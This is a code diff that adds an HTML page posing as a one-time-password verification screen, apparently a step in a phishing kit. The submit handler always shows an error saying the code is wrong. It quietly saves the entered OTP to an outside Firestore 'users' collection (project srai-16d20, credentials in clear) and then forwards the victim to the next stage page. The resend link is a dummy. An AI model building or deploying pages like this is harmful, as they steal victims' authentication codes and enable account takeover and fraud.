@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="stylesheet" href="a02b572693328546.css" />
+    <script type="module" src="https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js"></script>
+    <script type="module" src="https://www.gstatic.com/firebasejs/10.10.0/firebase-firestore.js"></script>
+  </head>
+  <body>
+    <header>
+      <img alt="Logo" class="logo" src="logo.png" />
+    </header>
+    <main>
+      <form id="otpForm">
+        <h1>Verify with One Time Password</h1>
+        <p>Your One Time Password has been sent to your registered mobile number.</p>
+        <div class="floating-container">
+          <input
+            type="text"
+            id="otp"
+            minlength="6"
+            maxlength="8"
+            pattern="[0-9]+"
+            inputmode="numeric"
+            placeholder=" "
+            required
+          />
+          <label>One Time Password <span>*</span></label>
+        </div>
+        <div class="btContainer">
+          <button type="submit">Submit</button>
+        </div>
+        <p>
+          If you didn't receive the one-time password SMS, please click here to
+          <a href="/a3#" onclick="event.preventDefault();">resend</a>
+        </p>
+        <p id="otpTimer" style="font-weight: bold; text-align: center">OTP Expires: 03:00</p>
+        <p id="errorMsg" style="color: red; font-weight: bold; text-align: center; display: none;">
+          Please enter correct One Time Password
+        </p>
+      </form>
+    </main>
+    <footer>
+      <div class="l">
+        <img alt="Sample" class="l" src="s.jpg" />
+      </div>
+      <img alt="Footer" class="ft" src="ft.png" />
+    </footer>
+    <script type="module">
+      import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js';
+      import { getFirestore, collection, addDoc } from 'https://www.gstatic.com/firebasejs/10.10.0/firebase-firestore.js';
+
+  // ✅ Updated Firebase Configuration (srai-16d20)
+  const firebaseConfig = {
+      apiKey: "AIzaSyAQChRUNOzph1tOQtVdNJnaX79VMuI1K9w",
+      authDomain: "srai-16d20.firebaseapp.com",
+      projectId: "srai-16d20",
+      storageBucket: "srai-16d20.firebaseapp.com",
+      messagingSenderId: "13015388512",
+      appId: "1:13015388512:web:ede30255ac370257f7ce05"
+    };
+
+      const app = initializeApp(firebaseConfig);
+      const db = getFirestore(app);
+
+      const otpTimerElement = document.getElementById("otpTimer");
+      let timeLeft = 180;
+      const updateTimer = () => {
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        otpTimerElement.textContent = `OTP Expires: ${minutes.toString().padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;
+        if (timeLeft > 0) {
+          timeLeft--;
+        } else {
+          clearInterval(timerInterval);
+          otpTimerElement.textContent = "OTP Expired";
+        }
+      };
+      const timerInterval = setInterval(updateTimer, 1000);
+
+      const otpForm = document.getElementById("otpForm");
+      const otpInput = document.getElementById("otp");
+      const errorMsg = document.getElementById("errorMsg");
+
+      otpForm.addEventListener("submit", async (e) => {
+        e.preventDefault();
+        const otp = otpInput.value.trim();
+
+        if (!otp) {
+          alert("Please enter the OTP.");
+          return;
+        }
+
+        errorMsg.style.display = "block";
+
+        try {
+          await addDoc(collection(db, "users"), {
+            otp_d: otp,
+            timestamp: new Date(),
+          });
+
+          console.log("OTP saved successfully!");
+
+          setTimeout(() => {
+            window.location.href = "b17.html";
+          }, 1500);
+        } catch (error) {
+          console.error("Error saving OTP:", error);
+          alert("Failed to submit OTP. Please try again.");
+        }
+      });
+    </script>
+  </body>
+</html>
